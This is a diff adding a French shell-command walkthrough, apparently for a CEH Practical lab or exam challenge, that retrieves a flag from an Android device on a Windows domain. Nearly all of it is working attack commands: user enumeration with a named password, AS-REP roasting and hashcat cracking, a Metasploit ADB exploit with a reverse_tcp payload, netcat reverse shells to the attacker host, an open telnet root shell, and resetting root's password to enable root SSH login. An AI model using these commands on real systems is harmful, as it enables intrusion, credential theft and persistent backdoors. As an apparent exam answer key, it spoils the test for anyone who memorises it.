@@ -1,0 +1,251 @@
+# ===================================================================
+# CEH PRACTICAL - AS-REP ROASTING + ANDROID POST-EXPLOITATION
+# Procédure complète pour récupérer flag.txt
+# ===================================================================
+
+# -------------------------------------------------------------------
+# ÉTAPE 1: Préparation - Lister les utilisateurs du domaine
+# -------------------------------------------------------------------
+
+# Depuis la machine Parrot (EH Workstation-1):
+crackmapexec smb 10.100.50.200 -u 'Emily' -p 'T3chieT1g3r2024' --users | grep -v "\[*\]" | awk '{print $NF}' > /home/parrot/Desktop/users.txt
+
+# OU via ldapsearch
+ldapsearch -x -H ldap://10.100.50.200 -D "CN=Emily,CN=Users,DC=CEH,DC=CYBERSPHERE,DC=com" -w "T3chieT1g3r2024" -b "DC=CEH,DC=CYBERSPHERE,DC=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > /home/parrot/Desktop/users.txt
+
+# -------------------------------------------------------------------
+# ÉTAPE 2: AS-REP Roasting - Récupérer les tickets
+# -------------------------------------------------------------------
+
+# Depuis Parrot:
+impacket-GetNPUsers CEH.CYBERSPHERE.com/ -dc-ip 10.100.50.200 -usersfile /home/parrot/Desktop/users.txt -format hashcat -outputfile /home/parrot/Desktop/asrep_hashes.txt -no-pass
+
+# Vérifier le contenu
+cat /home/parrot/Desktop/asrep_hashes.txt
+
+# -------------------------------------------------------------------
+# ÉTAPE 3: Cracker les tickets AS-REP avec Hashcat
+# -------------------------------------------------------------------
+
+# Mode 18200 = Kerberos 5 AS-REP (eAS-REP)
+hashcat -m 18200 -a 0 /home/parrot/Desktop/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+# Afficher le mot de passe cracké
+hashcat -m 18200 --show /home/parrot/Desktop/asrep_hashes.txt
+
+# Extraire le mot de passe (le mettre de côté pour plus tard)
+PASSWORD=$(hashcat -m 18200 --show /home/parrot/Desktop/asrep_hashes.txt | cut -d':' -f2)
+echo "Mot de passe AS-REP: $PASSWORD"
+
+# -------------------------------------------------------------------
+# ÉTAPE 4: Connexion au Meterpreter (port 5555 - Android ADB)
+# -------------------------------------------------------------------
+
+# Lancer Metasploit
+msfconsole -q -x "
+use exploit/android/adb/adb_server_exec;
+set RHOSTS 10.22.99.69;
+set RPORT 5555;
+set PAYLOAD android/meterpreter/reverse_tcp;
+set LHOST 10.22.99.169;
+set LPORT 4444;
+exploit -j
+"
+
+# OU si le Meterpreter est déjà actif, lister les sessions:
+# sessions -l
+# sessions -i <id>
+
+# -------------------------------------------------------------------
+# ÉTAPE 5: Post-Exploitation sur la machine Android via Meterpreter
+# -------------------------------------------------------------------
+
+# Une fois dans le Meterpreter, exécuter ces commandes:
+
+# 5.1 - Informations système
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > shell
+
+# 5.2 - Explorer le système de fichiers
+# (Dans le shell)
+whoami
+id
+pwd
+ls -la /
+ls -la /data
+ls -la /data/local
+ls -la /data/local/tmp
+ls -la /sdcard
+ls -la /storage
+
+# 5.3 - Vérifier les services disponibles
+which sshd
+which dropbear
+which busybox
+which nc
+which telnetd
+
+# 5.4 - Activer SSH (Dropbear)
+# Si dropbear est présent:
+dropbear -R -B -p 2222
+
+# OU avec busybox
+busybox telnetd -l /bin/sh -p 2323
+
+# OU créer un reverse shell pour accéder facilement
+# (Sur Parrot, écouter: nc -lvnp 4445)
+nc 10.22.99.169 4445 -e /bin/sh &
+
+# 5.5 - Créer un utilisateur SSH (si possible)
+echo "root:password" | chpasswd
+# OU activer le login root
+sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+/etc/init.d/sshd start
+
+# 5.6 - Sortir du shell pour revenir au Meterpreter
+exit
+
+# -------------------------------------------------------------------
+# ÉTAPE 6: Connexion SSH avec les identifiants AS-REP
+# -------------------------------------------------------------------
+
+# Depuis Parrot, une fois le SSH activé:
+ssh -o StrictHostKeyChecking=no -p 2222 <user_ASREP>@10.22.99.69
+
+# OU si SSH est sur le port standard:
+ssh -o StrictHostKeyChecking=no <user_ASREP>@10.22.99.69
+
+# Le mot de passe est celui récupéré à l'étape 3: $PASSWORD
+
+# -------------------------------------------------------------------
+# ÉTAPE 7: Trouver et Lire flag.txt
+# -------------------------------------------------------------------
+
+# Une fois connecté en SSH:
+
+# 7.1 - Chercher flag.txt partout
+find / -name "flag.txt" 2>/dev/null
+
+# 7.2 - Vérifier les dossiers communs
+ls -la /data/flags/
+ls -la /data/local/flags/
+ls -la /sdcard/flags/
+ls -la /storage/emulated/0/
+ls -la /root/
+
+# 7.3 - Si trouvé, lire le fichier
+cat /chemin/vers/flag.txt
+
+# 7.4 - Extraire les 6 derniers caractères (Format: A**aNa)
+cat /chemin/vers/flag.txt | tail -c 7
+
+# OU avec awk
+cat /chemin/vers/flag.txt | awk '{print substr($0, length($0)-5)}'
+
+# OU avec sed
+cat /chemin/vers/flag.txt | sed 's/.*\(.\{6\}\)$/\1/'
+
+# OU en une ligne complète:
+FLAG=$(cat /chemin/vers/flag.txt 2>/dev/null | tail -c 7 | tr -d '\n')
+echo "RÉPONSE: $FLAG"
+
+# -------------------------------------------------------------------
+# ÉTAPE 8: Commande Unique pour Extraire le Flag
+# -------------------------------------------------------------------
+
+# Une fois flag.txt localisé, cette commande donne les 6 derniers caractères:
+find / -name "flag.txt" -exec cat {} \; 2>/dev/null | tail -c 7 | tr -d '\n'
+
+# -------------------------------------------------------------------
+# ÉTAPE 9: Si le SSH ne fonctionne pas - Alternative avec le shell Meterpreter
+# -------------------------------------------------------------------
+
+# Depuis le shell Meterpreter (sans SSH):
+meterpreter > shell
+
+# Rechercher flag.txt directement depuis le shell Android
+find / -name "flag.txt" 2>/dev/null
+cat /chemin/vers/flag.txt
+cat /chemin/vers/flag.txt | tail -c 7
+
+# OU depuis Meterpreter directement:
+meterpreter > search -f flag.txt
+meterpreter > cat /chemin/vers/flag.txt
+
+# -------------------------------------------------------------------
+# ÉTAPE 10: Script de Secours - Reverse Shell
+# -------------------------------------------------------------------
+
+# Si aucun des services n'est disponible, créer un reverse shell:
+
+# Sur Parrot (attacker):
+nc -lvnp 8888
+
+# Depuis le shell Meterpreter (sur Android):
+nc 10.22.99.169 8888 -e /bin/sh &
+
+# OU avec busybox:
+busybox nc 10.22.99.169 8888 -e /bin/sh &
+
+# OU avec telnet:
+telnetd -l /bin/sh -p 2323
+
+# Depuis Parrot, se connecter au telnet:
+telnet 10.22.99.69 2323
+
+# -------------------------------------------------------------------
+# ÉTAPE 11: Script PowerShell (pour la machine Windows si RDP)
+# -------------------------------------------------------------------
+
+# Depuis la machine Windows (EH Workstation-2) si vous êtes en RDP:
+
+# 1. AS-REP avec Rubeus
+Rubeus.exe asreproast /domain:CEH.CYBERSPHERE.com /format:hashcat /outfile:C:\Users\Sofia\Desktop\asrep.txt
+
+# 2. Cracker avec Hashcat (sur Windows)
+hashcat.exe -m 18200 -a 0 C:\Users\Sofia\Desktop\asrep.txt C:\Users\Sofia\Desktop\rockyou.txt
+
+# 3. Afficher le mot de passe
+hashcat.exe -m 18200 --show C:\Users\Sofia\Desktop\asrep.txt
+
+# 4. Connexion ADB
+adb connect 10.22.99.69:5555
+adb shell
+
+# 5. Explorer et trouver flag.txt
+adb shell find / -name "flag.txt" 2>/dev/null
+adb shell cat /chemin/vers/flag.txt
+
+# 6. Extraire les 6 derniers caractères
+adb shell cat /chemin/vers/flag.txt | tail -c 7
+
+# -------------------------------------------------------------------
+# ÉTAPE 12: Dépannage - Vérification des ports et services
+# -------------------------------------------------------------------
+
+# Depuis Parrot, scanner la machine Android pour voir les services ouverts:
+nmap -p 1-65535 10.22.99.69
+
+# Vérifier si SSH est actif:
+nmap -p 22 10.22.99.69
+nmap -p 2222 10.22.99.69
+
+# Vérifier si telnet est actif:
+nmap -p 23 10.22.99.69
+nmap -p 2323 10.22.99.69
+
+# -------------------------------------------------------------------
+# RÉSUMÉ DES COMMANDES CLÉS (One-Liners)
+# -------------------------------------------------------------------
+
+# Commande complète depuis Parrot:
+impacket-GetNPUsers CEH.CYBERSPHERE.com/ -dc-ip 10.100.50.200 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -no-pass; hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force; PASSWORD=$(hashcat -m 18200 --show asrep_hashes.txt | cut -d':' -f2); echo "Mot de passe: $PASSWORD"; ssh -o StrictHostKeyChecking=no -p 2222 <user>@10.22.99.69
+
+# Extraire les 6 derniers caractères de flag.txt:
+find / -name "flag.txt" -exec cat {} \; 2>/dev/null | tail -c 7 | tr -d '\n'
+
+# -------------------------------------------------------------------
+# FORMAT ATTENDU: A**aNa (6 caractères)
+# Exemple: H**eLo1 ou F**lAg2 ou S**eCr3
+# -------------------------------------------------------------------
